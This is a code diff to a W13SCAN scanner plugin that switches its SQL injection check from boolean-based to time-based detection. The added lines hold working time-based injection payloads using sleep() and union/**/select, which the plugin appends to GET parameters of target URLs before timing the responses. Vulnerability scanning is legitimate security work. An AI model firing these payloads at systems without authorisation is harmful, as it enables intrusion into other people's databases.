@@ -1,24 +1,24 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# @Time    : 2019/6/30 4:19 PM
+# @Time    : 2019/6/30 4:44 PM
 # @Author  : w8ay
-# @File    : sql_inject_bool.py
+# @File    : sql_inject_time.py
 import copy
 import os
+import time
 from urllib.parse import urlparse
 
 import requests
 
-from lib.common import get_links, prepare_url, random_str
+from lib.common import get_links, prepare_url
 from lib.const import acceptedExt
 from lib.data import Share
-from lib.helper.diifpage import GetRatio
 from lib.output import out
 from lib.plugins import PluginBase
 
 
 class W13SCAN(PluginBase):
-    name = '基于布尔判断的SQL注入'
+    name = '基于时间的SQL注入'
     desc = '''目前仅支持GET方式的请求'''
 
     def audit(self):
@@ -53,33 +53,34 @@ class W13SCAN(PluginBase):
                 netloc = "{}://{}{}".format(p.scheme, p.netloc, p.path)
 
                 sql_flag = [
-                    "'and'{0}'='{1}",
-                    '"and"{0}"="{1}'
+                    "'and(select+sleep({time})union/**/select+1)='",
+                    '"and(select+sleep({time})union/**/select+1)="'
                 ]
                 for k, v in params.items():
                     data = copy.deepcopy(params)
                     for flag in sql_flag:
-                        # true page
-                        rand_str = random_str(2)
-                        payload1 = flag.format(rand_str, rand_str)
+                        # first request
+                        payload1 = flag.format(time=0)
                         data[k] = v + payload1
                         url1 = prepare_url(netloc, params=data)
                         if Share.in_url(url1):
                             continue
                         Share.add_url(url1)
+                        _ = time.time()
                         r = requests.get(url1, headers=headers)
                         html1 = r.text
-                        if GetRatio(resp_str, html1) < 0.78:  # 相似度随手一设～
-                            continue
+                        elapsed = time.time() - _
 
-                        # false page
-                        payload2 = flag.format(random_str(2), random_str(2))
+                        # second request
+                        payload2 = flag.format(time=2)
                         data[k] = v + payload2
+                        _ = time.time()
                         r2 = requests.get(netloc, params=data, headers=headers)
                         html2 = r2.text
-                        if GetRatio(resp_str, html2) < 0.22:  # 相似度随手设置
-                            msg = " {k}:{v} !== {k}:{v1} and {k}:{v} === {k}:{v2}".format(k=k, v=v, v1=payload1,
-                                                                                          v2=payload2)
+                        elapsed2 = time.time() - _
+                        if elapsed2 - elapsed > 1.5:
+                            msg = " {k}:{v1} 耗时 {time1}s; {k}:{v2} 耗时 {time2}s".format(k=k, v1=payload1, v2=payload2,
+                                                                                       time1=elapsed, time2=elapsed2)
                             # out.log(msg)
                             out.success(link, self.name, payload=k, condition=msg)
                             break
